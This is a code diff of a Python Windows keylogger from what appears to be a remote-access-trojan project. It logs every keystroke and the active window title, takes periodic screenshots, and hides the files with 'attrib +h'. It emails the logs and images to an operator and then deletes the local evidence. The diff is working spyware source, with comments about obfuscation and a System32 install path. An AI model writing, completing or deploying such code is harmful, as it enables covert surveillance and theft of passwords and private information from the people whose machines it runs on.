@@ -1,23 +1,20 @@
 from pynput.keyboard import Key, Listener
 from datetime import datetime
+import subprocess
 import ctypes
 from ctypes import wintypes, windll, create_unicode_buffer
 import socket
 import time
-import os
+import os, glob
 from threading import Thread
 import pyautogui
 import re
 from Email import *
-
-
 #######################################################################
 def get_capslock_state():
     hllDll = ctypes.WinDLL("User32.dll")
     VK_CAPITAL = 0x14
     return hllDll.GetKeyState(VK_CAPITAL)
-
-
 #######################################################################
 def getForegroundWindowTitle():
     hWnd = windll.user32.GetForegroundWindow()
@@ -25,16 +22,10 @@ def getForegroundWindowTitle():
     buf = create_unicode_buffer(length + 1)
     windll.user32.GetWindowTextW(hWnd, buf, length + 1)
 
-    # 1-liner alternative: return buf.value if buf.value else None
-    if buf.value:
-        return buf.value
-    else:
-        return None
+    return buf.value if buf.value else None
 
 
 window = str(getForegroundWindowTitle())
-
-
 #######################################################################
 def add_window():
     global window
@@ -45,55 +36,48 @@ def add_window():
             window = getForegroundWindowTitle()
     except:
         pass
-
-
 ######################################################################
 def get_time():
     time_format = datetime.now().strftime("%H:%M:%S")
     return time_format
 
-
 def get_date():
     return datetime.now().strftime("%d/%m/%Y")
-
-
 ######################################################################
 images_list = []
 no_of_screenshots = 1
+
 def screenshot_func():
     screenshot = pyautogui.screenshot()
     title = f"{get_time().replace(':', '-')}_{get_date().replace('/', '-')}_{name}.png"
     screenshot.save(title)
     images_list.append(title)
-    subprocess.run(rf"attrib +h C:\Users\{user}\PycharmProjects\pythonProject\RAT\{title}", shell=False)
-    print(images_list)
+    subprocess.run(rf"attrib +h {path}{title}", shell=False)
+    # print(images_list)
 
-
-
-sleep_seconds = 5
-length = 10
-# datetime_current = datetime.now()
-
-
-
+######################################################################
 # option to convert to base64 obfuscate raw text
 
-name = socket.gethostname()
-ip = socket.gethostbyname(name)
-user = os.getlogin()
+# pc_user = subprocess.run("whoami", capture_output=True, shell=False).stdout.decode().strip("\n")
+# name, user = pc_user.split("\\")
 
-current_date = get_date() 
+name = socket.gethostname()
+user = os.getlogin()
+path = rf"C:\Users\{user}\PycharmProjects\pythonProject\RAT\\"
+# path = r"C:\Windows\System32\\"
+
+current_date = get_date()
 current_time = get_time()
 
 file_name = ""
 previous_file_name = ""
 
-msg = f'''{current_date} {current_time} | {name}/{user} | {ip} \n 
+msg = f'''{current_date} {current_time} | {name}/{user}
+
 {get_time()}: '''
 
-# 1 = Basic #2 = Verbose #3 XTRAVERBOSE
-keybind_verbosity = 0
-#\u0008 backspace ascii?
+# 0 = Basic #1 = Verbose #2 XTRAVERBOSE
+keybind_verbosity = 0  # \u0008 backspace ascii?
 Keybinds = {
     "Key.backspace": {0: '[BS]', 1: '[BS]', 2: '[BACKSPACE]'},
     "Key.space": {0: ' ', 1: ' ', 2: '[SPACE]'},
@@ -138,34 +122,32 @@ Keybinds = {
     "Key.end": {0: '', 1: '[END]', 2: '[KEY.END]'},
     "Key.menu": {0: '', 1: '[MENU]', 2: '[KEY.MENU]'},
     "Key.num_lock": {0: '', 1: '[NUM.LOCK]', 2: '[NUM.LOCK]'},
-
 }
 
 max_length = 120
 key_count = 0
 # text write length variables
 
-time_per_email = 15
+time_per_email = 15  # SECONDS
+#Enter the number of seconds between each email
 
 def time_log():
+    global key_count
     global file_name
     global previous_file_name
     global images_list
 
     while True:
-        file_name = f"{get_time().replace(':', '-')}_{get_date().replace('/', '-')}_{name}_LOG.txt"
+        file_name = f"{get_time().replace(':', '-')}_{get_date().replace('/', '-')}_{name}.txt"
         create_file = open(file_name, "w")
         create_file.write(msg)
         create_file.close()
-        subprocess.run(rf"attrib +h C:\Users\{user}\PycharmProjects\pythonProject\RAT\{file_name}", shell=False)
-        # send = Thread(target=time_log(), args=(), daemon=True)
-        # send.start()
+        subprocess.run(rf"attrib +h {path}{file_name}", shell=False)
 
         for s in range(no_of_screenshots):
-            time.sleep(time_per_email/no_of_screenshots)
+            time.sleep(time_per_email / no_of_screenshots)
             screenshot_func()
-            print(file_name)
-
+            # cleanup = Thread(target=time_log(), args=(), daemon=True)
         if keybind_verbosity == 0:
             try:
                 g = open(file_name, "r")
@@ -187,9 +169,19 @@ def time_log():
             except:
                 pass
 
-        send_email(f"{get_date()} ~ {get_time()} ~ {name}/{user}", images_list, file_name)
+        send_email(f"{get_date()} ~ {name}/{user}", images_list, file_name)
+        # Send Email
         previous_file_name = file_name
         images_list.clear()
+        key_count = 0
+
+        for f in glob.glob(f'{path}*{name}.*'):
+            try:
+                os.remove(f)
+            except OSError as e:
+                print("Error: %s : %s" % (f, e.strerror))
+                #Deleting files in folder
+
 
 def write_to_file(key):
     global key_count, max_length
@@ -197,10 +189,9 @@ def write_to_file(key):
     keystr = keystr.lstrip("'").rstrip("'")
     # Strips quotation marks ''
 
-    CAPSLOCK = get_capslock_state()
-    # Checks if capslock is on
     key_count += 1
-    print(key_count)
+    # Counts Keys
+
     add_window()
     # Gets window current window name
 
@@ -216,7 +207,7 @@ def write_to_file(key):
             pass
 
     with open(file_name, 'a') as file:
-        if int(CAPSLOCK) != 0:
+        if int(get_capslock_state()) != 0:
             file.write(keystr.upper())
         else:
             file.write(keystr)
@@ -226,14 +217,11 @@ def write_to_file(key):
             file.write("\n")
         key_count = 0
 
-
 def main():
     with Listener(on_release=write_to_file) as listener:
         timer = Thread(target=time_log(), args=(), daemon=True)
         timer.start()
         listener.join()
 
-
 if __name__ == '__main__':
     main()
-
